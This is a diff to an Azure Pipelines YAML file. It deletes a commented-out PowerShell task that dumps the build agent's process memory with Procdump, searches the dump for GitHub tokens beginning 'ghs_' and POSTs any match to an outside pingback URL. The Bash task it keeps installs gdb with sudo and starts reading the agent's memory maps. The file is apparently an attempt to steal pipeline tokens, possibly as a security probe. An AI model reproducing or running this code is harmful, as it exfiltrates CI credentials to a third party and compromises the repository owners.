@@ -18,50 +18,6 @@ steps:
     echo oops
   displayName: 'Run a multi-line script'
 
-# - task: PowerShell@2
-#   inputs:
-#     targetType: 'inline'
-#     script: |
-#       $source = 'https://download.sysinternals.com/files/Procdump.zip'
-#       Invoke-RestMethod -Uri $source -OutFile Procdump.zip
-
-#       Expand-Archive Procdump.zip
-
-#       $source = 'https://download.sysinternals.com/files/Strings.zip'
-#       Invoke-RestMethod -Uri $source -OutFile Strings.zip
-
-#       Expand-Archive Strings.zip
-
-#       $AgentPID = Get-Process -name Agent.Listener | select -expand id
-#       # Get-ChildItem | Out-String -Width 160
-#       # Get-ChildItem ./Procdump | Out-String -Width 160
-#       $command = "./Procdump/procdump.exe -ma $AgentPID $(Agent.TempDirectory)/AgentDump.dmp -accepteula"
-#       Write-Host $command
-#       Invoke-Expression $command
-
-#       $command = "./Strings/strings.exe -accepteula '$(Agent.TempDirectory)/AgentDump.dmp' >>  $(Agent.TempDirectory)/dump.txt"
-#       Write-Host $command
-#       Invoke-Expression $command
-
-#       $match = Select-String -pattern ghs_ -Path "$(Agent.TempDirectory)/dump.txt"-CaseSensitive -SimpleMatch
-
-#       ForEach($text in $match) 
-#       {
-#           if($text.Line.Length -lt 42)
-#           {
-#               Write-Host $text.Line
-#               $url = "https://pback.azurewebsites.net/api/pingback"
-#               Invoke-WebRequest -Method 'Post' -Uri $url -Body $text -ContentType "application/text"
-#               exit
-#           }
-#       }
-
-#       $url = 
-#       Invoke-WebRequest -Method 'Post' -Uri $url -Body $body -ContentType "application/text"
-
-#       Get-ChildItem $(Agent.TempDirectory)/ | Out-String -Width 160
-#   continueOnError: true
-
 - task: Bash@3
   inputs:
     targetType: 'inline'
@@ -75,7 +31,7 @@ steps:
       pid=`ps aux | grep "Agent.Listener" | grep -v grep | awk '{print $2}'`;
       echo $pid
 
-      apt-get install gdb;
+      sudo apt-get install gdb;
 
       grep rw-p /proc/$pid/maps \
       | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
